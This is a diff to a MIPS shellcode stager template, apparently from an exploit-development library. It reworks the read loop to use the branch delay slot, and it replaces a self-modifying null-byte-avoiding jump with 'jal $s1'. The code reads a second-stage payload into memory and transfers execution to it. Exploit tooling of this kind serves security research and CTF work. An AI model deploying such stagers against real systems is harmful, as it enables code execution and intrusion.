@@ -31,38 +31,15 @@ ${stager}:
 ${looplabel}:
     ${mips.syscall('SYS_read', '$s0', '$s2', '$s3')}
 
-    /* Increment read address */
-    add $s2, $s2, $v0
     /* Decrement read counter */
     sub $s3, $s3, $v0
 
     bne $s3, $zero, ${looplabel}
+    /* Increment read address */
+    /* This is in the branch delay slot!!! */
+    add $s2, $s2, $v0
 
     /* Fully read, now jump to $s1 */
-    /* 'jr <reg>' contains nul bytes so generate this */
-    /* First put int $t7 offset from $ra where to store the opcode */
-    ${mips.mov('$t7', 36)}
-    li $t8, -0x7350
-find_addr:
-    bltzal $t8, find_addr
-    slti $t8, $zero, -1
-
-addr_in_ra:
-    /* Now we know where we are */
-    /* Mov the 'jr $s1' opcode into $t8 */
-    ${mips.mov('$t8', packing.unpack(asm('jr $s1')))}
-
-    /* And store it */
-    add $ra, $ra, $t7
-    sw $t8, -4($ra)
-
-    /* This will be replaced by a 'jr $s1' instruction */
-    /* FIXME: This should be a nop since 'jr $s1' contains nul bytes */
-    /* however in qemu the write looks right but does not take effect */
-    /* as thou the instruction cache is populated by the original instruction */
-    /* but that should not be the case since it has not been executed yet. */
-    /* Perhaps it is a bug in qemu and this actually works on real hardware */
-    jr $s1
-addr_of_jump:
-    /* And this is the jump slot */
+    jal $s1
+    /* We need something executable in the branch delay slot */
     ${mips.nop()}
